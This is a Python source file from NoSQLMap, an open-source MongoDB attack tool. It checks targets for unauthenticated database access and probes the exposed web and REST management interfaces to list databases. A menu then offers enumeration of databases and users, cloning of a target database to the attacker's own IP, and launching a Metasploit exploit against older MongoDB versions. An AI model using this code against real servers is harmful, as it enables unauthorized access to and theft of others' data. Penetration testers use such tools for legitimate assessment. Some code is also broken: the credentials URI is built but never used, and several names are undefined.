#!/usr/bin/python
#NoSQLMap Copyright 2014 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
import pymongo
import urllib

def netAttacks(target, port):
	print "DB Access attacks (MongoDB)"
	print "================="
	mgtOpen = False
	webOpen = False
	mgtSelect = True
	#This is a global for future use with other modules; may change
	global dbList
	global dbPort
	dbList = []
	
	print "Checking to see if credentials are needed..."
	needCreds = accessCheck(target,dbPort,False)
	
	if needCreds[0] == 0:
		conn = pymongo.MongoClient(target,dbPort)
		print "Successful access with no credentials!"
		mgtOpen = True
	
	elif needCreds[0] == 1:
		print "Login required!"
		srvUser = raw_input("Enter server username: ")
		srvPass = raw_input("Enter server password: ")
		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
		
		try:
			conn = pymongo.MongoClient(target)
			print "MongoDB authenticated on " + target + ":27017!"
			mgtOpen = True
		except:
			raw_input("Failed to authenticate.  Press enter to continue...")
			return
	
	elif needCreds[0] == 2:
		conn = pymongo.MongoClient(target,dbPort)
		print "Access check failure.  Testing will continue but will be unreliable."
		mgtOpen = True
	
	elif needCreds[0] == 3:
		print "Couldn't connect to Mongo server."
		return
	
	
	mgtUrl = "http://" + target + ":28017"	
	#Future rev:  Add web management interface parsing
	
	try:
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
			testRest = raw_input("Start tests for REST Interface (y/n)? ")

		if testRest in yes_tag:
			restUrl = mgtUrl + "/listDatabases?text=1"
			restResp = urllib.urlopen(restUrl).read()
			restOn = restResp.find('REST is not enabled.')

			if restOn == -1:
				print "REST interface enabled!"
				dbs = json.loads(restResp)
				menuItem = 1
				print "List of databases from REST API:"

				for x in range(0,len(dbs['databases'])):
					dbTemp= dbs['databases'][x]['name']
					print str(menuItem) + "-" + dbTemp
					menuItem += 1
			else:
				print "REST interface not enabled."
			print "\n"

	except:		
		print "MongoDB web management closed or requires authentication."	
		
	if mgtOpen == True:
		
		while mgtSelect:
			print "\n"
			print "1-Get Server Version and Platform"
			print "2-Enumerate Databases/Collections/Users"
			print "3-Check for GridFS"
			print "4-Clone a Database"
			print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
			print "6-Return to Main Menu"
			attack = raw_input("Select an attack: ")
	
			if attack == "1":
				print "\n"
				getPlatInfo(conn)
			
			if attack == "2":
				print "\n"
				enumDbs(conn)
			
			if attack == "3":
				print "\n"
				enumGrid(conn)
			
			if attack == "4":
				if optionSet[4] == False:
					print "Target database not set!"
				else:
					print "\n"
					stealDBs(myIP,conn)
			
			if attack == "5":
				print "\n"
				msfLaunch()
			
			if attack == "6":
				return
